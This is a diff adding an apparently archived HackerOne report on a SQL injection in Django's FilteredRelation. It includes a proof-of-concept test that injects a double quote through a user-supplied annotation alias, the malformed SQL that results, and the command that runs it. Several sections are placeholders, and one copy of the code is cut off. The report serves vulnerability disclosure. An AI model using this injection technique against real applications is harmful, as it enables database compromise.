@@ -1,0 +1,93 @@
+# SQL Injection when using FilteredRelation
+
+## Metadata
+- **Source:** HackerOne
+- **Report:** 3292573 | https://hackerone.com/reports/3292573
+- **Submitted:** 2025-08-09
+- **Reporter:** eyalsec
+- **Program:** Unknown
+- **Bounty:** Not disclosed
+- **Severity:** critical
+- **Vuln:** SQL Injection
+- **CVEs:** None
+- **Category:** uncategorised
+
+## Summary
+Hi Django team :)
+
+Vulnerability location:
+https://github.com/django/django/blob/main/tests/filtered_relation/tests.py#L124
+
+You may create my POC function above the "test_select_related_foreign_key" function:
+```
+    def test_select_related_foreign_key_sqli(self):
+        user_data = "author_join2\""
+
+        qs = (
+            Book.objects.annotate(**{
+                user_data: FilteredRelation
+
+## Attack scenario
+*(see original)*
+
+## Root cause
+*(see original)*
+
+## Attacker mindset
+*(see original)*
+
+## Defensive takeaways
+*(see original)*
+
+## Variant hunting
+*(see original)*
+
+## MITRE ATT&CK
+*(see original)*
+
+## Notes
+*(see original)*
+
+## Full report
+<details><summary>Expand</summary>
+
+Hi Django team :)
+
+Vulnerability location:
+https://github.com/django/django/blob/main/tests/filtered_relation/tests.py#L124
+
+You may create my POC function above the "test_select_related_foreign_key" function:
+```
+    def test_select_related_foreign_key_sqli(self):
+        user_data = "author_join2\""
+
+        qs = (
+            Book.objects.annotate(**{
+                user_data: FilteredRelation("author"),
+        })
+            .select_related(user_data)
+        )
+
+        qs._fetch_all()
+```
+
+SQL Query:
+`SELECT "filtered_relation_book"."id", "filtered_relation_book"."title", "filtered_relation_book"."author_id", "filtered_relation_book"."editor_id", "filtered_relation_book"."number_editor", "filtered_relation_book"."editor_number", "filtered_relation_book"."state", author_join2"."id", author_join2"."name", author_join2"."content_type_id", author_join2"."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join2" ON ("filtered_relation_book"."author_id" = author_join2"."id")`
+
+{F4660052}
+
+To execute the SQLI  you may run:
+`python3 django/tests/runtests.py filtered_relation.tests.FilteredRelationTests.test_select_related_foreign_key_sqli`
+
+## Impact
+
+The impact is direct SQL Injection for any user with access to `select_related(` as above.
+
+I hope you have a great day!!!
+
+Eyal :)
+
+</details>
+
+---
+*Analysed by Claude on 2026-05-24*
